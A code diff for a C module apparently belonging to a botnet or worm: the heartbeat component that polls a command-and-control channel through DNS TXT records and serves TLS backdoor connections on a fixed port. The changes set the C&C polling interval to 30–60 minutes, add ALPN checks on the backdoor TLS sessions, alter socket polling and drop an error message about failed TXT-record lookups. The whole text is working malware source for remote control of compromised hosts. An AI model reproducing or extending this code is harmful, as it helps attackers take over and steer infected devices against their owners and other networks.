@@ -21,11 +21,9 @@
 // Hover Max Redirection count
 #define HTBT_HOVER_MAX_REDIR	5
 // CNCP interval: HTBT_CNCP_INT_MIN + variance
-// #define HTBT_CNCP_INT_MIN	1800000 // half an hour minimum interval
-// #define HTBT_CNCP_INT_VAR	1800000 // half an hour variance
-// TODO
-#define HTBT_CNCP_INT_MIN		59000
-#define HTBT_CNCP_INT_VAR		2000
+// between 30 minutes and an hour
+#define HTBT_CNCP_INT_MIN	1800000 // half an hour minimum interval
+#define HTBT_CNCP_INT_VAR	1800000 // half an hour variance
 #define HTBT_LBD_PORT			prne_htobe16(PRNE_HTBT_PROTO_PORT)
 #define HTBT_LBD_BACKLOG		4
 
@@ -263,6 +261,28 @@ static void htbt_main_empty_req_q (prne_htbt_t *ctx) {
 	prne_llist_clear(&ctx->main.req_q);
 }
 
+static bool htbt_verify_alp (
+	const mbedtls_ssl_config *conf,
+	const mbedtls_ssl_context *ctx)
+{
+	bool has_alpn = false;
+
+	for (const char **a = conf->alpn_list; a != NULL && *a != NULL; a += 1) {
+		if (strcmp(*a, PRNE_HTBT_TLS_ALP) == 0) {
+			has_alpn = true;
+			break;
+		}
+	}
+
+	if (!has_alpn) {
+		// ALP verification is disabled.
+		return true;
+	}
+	return prne_nstreq(
+		mbedtls_ssl_get_alpn_protocol(ctx),
+		PRNE_HTBT_TLS_ALP);
+}
+
 /* htbt_relay_child()
 */
 static prne_htbt_status_code_t htbt_relay_child (
@@ -374,7 +394,7 @@ static prne_htbt_status_code_t htbt_relay_child (
 			} while (false);
 		}
 
-		if (pfd[0].revents & POLLIN) {
+		if (pfd[0].revents) {
 			f_ret = ctx->read_f(
 				ctx->ioctx,
 				ctx->iobuf[0].m + ctx->iobuf[0].len,
@@ -397,7 +417,7 @@ static prne_htbt_status_code_t htbt_relay_child (
 			}
 		}
 
-		if (pfd[1].revents & POLLOUT) {
+		if (pfd[1].revents) {
 			f_ret = ctx->write_f(
 				ctx->ioctx,
 				ctx->iobuf[1].m,
@@ -754,7 +774,7 @@ static void htbt_slv_consume_outbuf (
 		{
 			break;
 		}
-		if (fret == 1 && pfd.revents & POLLOUT) {
+		if (fret == 1 && pfd.revents) {
 			fret = ctx->write_f(
 				ctx->ioctx,
 				ctx->iobuf[1].m,
@@ -1088,7 +1108,7 @@ static bool htbt_slv_srv_bin (
 				goto SND_STATUS;
 			}
 
-			if (pfd.revents & POLLIN) {
+			if (pfd.revents) {
 				f_ret = ctx->read_f(
 					ctx->ioctx,
 					ctx->iobuf[0].m,
@@ -1100,9 +1120,6 @@ static bool htbt_slv_srv_bin (
 					goto PROTO_ERR;
 				}
 				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
-			}
-			else if (pfd.revents) {
-				goto END;
 			}
 		}
 
@@ -1373,10 +1390,10 @@ static void *htbt_slv_entry (void *p) {
 				prne_pth_tstimeout(HTBT_SLV_SCK_OP_TIMEOUT));
 			prne_assert(ev_timeout != NULL);
 
-			if (pfd[1].revents & POLLOUT) {
+			if (pfd[1].revents) {
 				htbt_slv_consume_outbuf(ctx, 0, ev_timeout);
 			}
-			if (pfd[0].revents & POLLIN) {
+			if (pfd[0].revents) {
 				if (ctx->iobuf[0].avail == 0) {
 					prne_dbgpf("** Malicious client?\n");
 					ctx->valid = false;
@@ -1544,6 +1561,10 @@ static bool htbt_main_slv_setup_f (void *ioctx, pth_event_t ev) {
 		ctx->fd,
 		ev))
 	{
+		ret = false;
+		goto END;
+	}
+	if (!htbt_verify_alp(ctx->parent->param.main_ssl_conf, &ctx->ssl)) {
 		ret = false;
 		goto END;
 	}
@@ -1917,10 +1938,7 @@ static void htbt_cncp_stream_slv (
 				pth_mutex_release(&ctx->lock);
 
 				f_ret = write(c.fd[1], trio.m, trio.len);
-				if (f_ret == 0 ||
-					(f_ret < 0 &&
-					(errno != EWOULDBLOCK && errno != EAGAIN)))
-				{
+				if (f_ret <= 0) {
 					goto END;
 				}
 				prne_iobuf_shift(&trio, -f_ret);
@@ -2026,11 +2044,6 @@ static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
 			&cv,
 			prne_recmb_msb32(len[0], len[1], len[2], len[3]));
 	}
-	else {
-		prne_dbgpf(
-			"* TXTREC resolv error: %s\n",
-			prne_resolv_qr_tostr(prm.fut->qr));
-	}
 
 END:
 	prne_memzero(ctx->cncp.txtrec, sizeof(ctx->cncp.txtrec));
@@ -2082,7 +2095,7 @@ static bool htbt_lbd_slv_setup_f (void *ioctx, pth_event_t ev) {
 		&ctx->ssl,
 		mbedtls_ssl_handshake,
 		ctx->fd,
-		ev);
+		ev) && htbt_verify_alp(ctx->parent->param.lbd_ssl_conf, &ctx->ssl);
 }
 
 static void htbt_lbd_slv_cleanup_f (void *ioctx, pth_event_t ev) {
@@ -2411,9 +2424,13 @@ static void free_htbt_wkr_ctx (void *p) {
 	prne_free_llist(&ctx->main.req_q);
 	prne_free_llist(&ctx->main.hover_req);
 
-	pth_abort(ctx->cncp.pth);
+	if (ctx->cncp.pth != NULL) {
+		pth_abort(ctx->cncp.pth);
+	}
 
-	pth_abort(ctx->lbd.pth);
+	if (ctx->lbd.pth != NULL) {
+		pth_abort(ctx->lbd.pth);
+	}
 	prne_close(ctx->lbd.fd);
 	htbt_lbd_empty_conn_list(ctx);
 	prne_free_llist(&ctx->lbd.conn_list);
@@ -2433,7 +2450,6 @@ prne_htbt_t *prne_alloc_htbt (
 		param.cncp_ssl_conf == NULL ||
 		param.main_ssl_conf == NULL ||
 		param.ctr_drbg == NULL ||
-		param.resolv == NULL ||
 		param.blackhole < 0)
 	{
 		errno = EINVAL;
@@ -2463,16 +2479,23 @@ prne_htbt_t *prne_alloc_htbt (
 	prne_init_llist(&ret->lbd.conn_list);
 	ret->lbd.fd = -1;
 
-	ret->cncp.pth = pth_spawn(
-		PTH_ATTR_DEFAULT,
-		htbt_cncp_entry,
-		ret);
-	if (ret->cncp.pth == NULL || pth_suspend(ret->cncp.pth) == 0) {
-		goto ERR;
+	if (param.resolv != NULL) {
+		ret->cncp.pth = pth_spawn(
+			PTH_ATTR_DEFAULT,
+			htbt_cncp_entry,
+			ret);
+		if (ret->cncp.pth != NULL) {
+			pth_suspend(ret->cncp.pth);
+		}
 	}
 
 	ret->lbd.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_lbd_entry, ret);
-	if (ret->lbd.pth == NULL || pth_suspend(ret->lbd.pth) == 0) {
+	if (ret->lbd.pth != NULL) {
+		pth_suspend(ret->lbd.pth);
+	}
+
+	if (ret->lbd.pth == NULL && ret->cncp.pth == NULL) {
+		// no producers. No point running main
 		goto ERR;
 	}
 
